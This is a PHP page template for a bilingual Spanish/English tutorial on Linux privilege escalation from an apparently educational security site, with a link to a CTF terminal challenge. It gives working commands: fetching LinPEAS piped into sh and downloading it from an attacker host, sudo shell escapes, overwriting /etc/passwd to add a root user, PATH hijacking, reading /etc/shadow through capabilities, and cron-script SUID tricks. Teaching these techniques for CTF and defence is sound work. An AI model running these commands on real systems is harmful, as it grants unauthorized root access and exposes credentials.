<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'Escalada de Privilegios en Linux — CyberEscudo' : 'Linux Privilege Escalation — CyberEscudo';
$contentTitle = $lang==='es' ? 'Escalada de Privilegios en Linux' : 'Linux Privilege Escalation';
$contentDate  = '2024-07-15';
$contentDiff  = 'advanced';
$contentTags  = ['Privilege Escalation','LinPEAS','SUID','Sudo','Cron','Linux'];
ob_start(); if ($lang==='es'): ?>
<div class="prose">
  <p>La <strong>escalada de privilegios</strong> consiste en explotar configuraciones incorrectas o vulnerabilidades para pasar de un usuario con pocos permisos (<code>www-data</code>, usuario normal) a <code>root</code>. Es una fase crítica en cualquier intrusión real o CTF.</p>

  <h2>1. Enumeración automática con LinPEAS</h2>
  <pre><code># Descargar y ejecutar LinPEAS desde el objetivo:
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Transferir desde tu máquina atacante (servidor HTTP):
python3 -m http.server 8000
# En víctima:
wget http://TU_IP:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt</code></pre>

  <h2>2. Sudo mal configurado (Sudoers)</h2>
  <p>A menudo, los administradores permiten a los usuarios ejecutar ciertos comandos como root sin necesidad de contraseña para automatizar tareas. Si esos comandos tienen funciones de ejecución anidadas, podemos saltar a una shell de root.</p>
  <pre><code># Ver qué puede ejecutar el usuario actual como sudo:
sudo -l

# (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/bash \; -quit

# (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/passwd
# una vez dentro de less, escribe: !bash</code></pre>

  <!-- ─── SECCIÓN DEL RETO CTF 06 (ESPAÑOL) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> Simulador de Terminal (CTF)
      </h3>
      <p style="margin-bottom: 1.5rem;">He preparado una terminal web que simula el acceso inicial a una máquina Linux como usuario <code>www-data</code>. Averigua qué permisos tienes y explótalos para conseguir privilegios de <code>root</code>.</p>
      <a href="/ctf/ctf-06.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ INICIAR RETO CTF 06
      </a>
  </div>

  <h2>3. Binarios SUID y SGID explotables</h2>
  <p>Los binarios con el bit SUID activo se ejecutan con los permisos de su propietario (generalmente root) sin importar quién los lance. El portal <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> es tu mejor aliado aquí.</p>
  <pre><code># Buscar binarios con bit SUID activado:
find / -perm -4000 -type f 2>/dev/null

# /usr/bin/cp (Sobrescribir contraseñas):
openssl passwd -1 hackeado123
echo "hacker:HASH_GENERADO:0:0:root:/root:/bin/bash" >> /tmp/passwd.bak
cp /tmp/passwd.bak /etc/passwd
su hacker</code></pre>

  <h2>4. PATH Hijacking (Secuestro del PATH)</h2>
  <p>Si un binario SUID ejecuta comandos internamente (como <code>ls</code> o <code>cat</code>) sin usar su ruta absoluta (<code>/bin/ls</code>), podemos crear nuestro propio <code>ls</code> malicioso y alterar el PATH para que Linux lo ejecute como root.</p>
  <pre><code># 1. Crear el binario falso en /tmp
echo '/bin/bash -p' > /tmp/ls
chmod +x /tmp/ls

# 2. Secuestrar el PATH colocando /tmp el primero
export PATH=/tmp:$PATH

# 3. Ejecutar el binario SUID vulnerable que llama a "ls"
./programa_vulnerable</code></pre>

  <h2>5. Linux Capabilities</h2>
  <p>Las <em>Capabilities</em> son una alternativa moderna a SUID que otorga permisos de root fragmentados (como poder abrir puertos o leer archivos concretos) a binarios específicos. Son más sigilosas e igual de peligrosas.</p>
  <pre><code># Listar binarios con capabilities:
getcap -r / 2>/dev/null

# Ejemplo: Si python o tar tienen cap_dac_read_search+ep, 
# pueden leer cualquier archivo del sistema como /etc/shadow sin ser root.
tar -cvf shadow.tar /etc/shadow</code></pre>

  <h2>6. Tareas cron y scripts con permisos débiles</h2>
  <pre><code># Listar crons del sistema:
cat /etc/crontab

# Si un cron ejecuta un script de root que es escribible por nosotros:
echo 'chmod +s /bin/bash' >> /ruta/al/script.sh
# Esperar a que se ejecute el cron, luego:
/bin/bash -p</code></pre>
</div>

<?php else: ?>
<div class="prose">
  <p><strong>Privilege escalation</strong> involves exploiting misconfigurations or vulnerabilities to move from a low-privileged user (<code>www-data</code>, normal user) to <code>root</code>. It is a critical phase in any real-world intrusion or CTF challenge.</p>

  <h2>1. Automated Enumeration with LinPEAS</h2>
  <pre><code># Download and run LinPEAS directly on target:
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</code></pre>

  <h2>2. Misconfigured Sudo (Sudoers)</h2>
  <p>Administrators often allow users to run specific commands as root without a password. If those commands have subshell features, we can spawn a root shell.</p>
  <pre><code># Check allowed sudo commands:
sudo -l

# (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/bash \; -quit

# (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/passwd
# inside less, type: !bash</code></pre>

  <!-- ─── SECCIÓN DEL RETO CTF 06 (INGLÉS) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> Terminal Simulator (CTF)
      </h3>
      <p style="margin-bottom: 1.5rem;">I've prepared a web terminal simulating initial access to a Linux machine as user <code>www-data</code>. Enumerate your permissions and exploit them to get <code>root</code> privileges.</p>
      <a href="/ctf/ctf-06.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ START CTF 06 CHALLENGE
      </a>
  </div>

  <h2>3. Exploitable SUID and SGID Binaries</h2>
  <p>SUID binaries execute with the permissions of their owner (usually root). Check <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> for bypasses.</p>
  <pre><code># Find SUID binaries:
find / -perm -4000 -type f 2>/dev/null</code></pre>

  <h2>4. PATH Hijacking</h2>
  <p>If a SUID binary calls a system command without an absolute path (e.g., <code>ls</code> instead of <code>/bin/ls</code>), we can hijack the PATH variable to execute our own malicious binary as root.</p>
  <pre><code>echo '/bin/bash -p' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
./vulnerable_suid_binary</code></pre>

  <h2>5. Linux Capabilities</h2>
  <p>Capabilities are a modern alternative to SUID, granting fragmented root permissions (like network manipulation or file reading) to specific binaries.</p>
  <pre><code># List binaries with capabilities:
getcap -r / 2>/dev/null</code></pre>

  <h2>6. Cron Jobs & Weak Script Permissions</h2>
  <pre><code># System crons:
cat /etc/crontab

# If a cron script is writable by our user:
echo 'chmod +s /bin/bash' >> /path/to/script.sh
/bin/bash -p</code></pre>
</div>
<?php endif; $contentBody=ob_get_clean(); require __DIR__.'/../templates/content-page.php';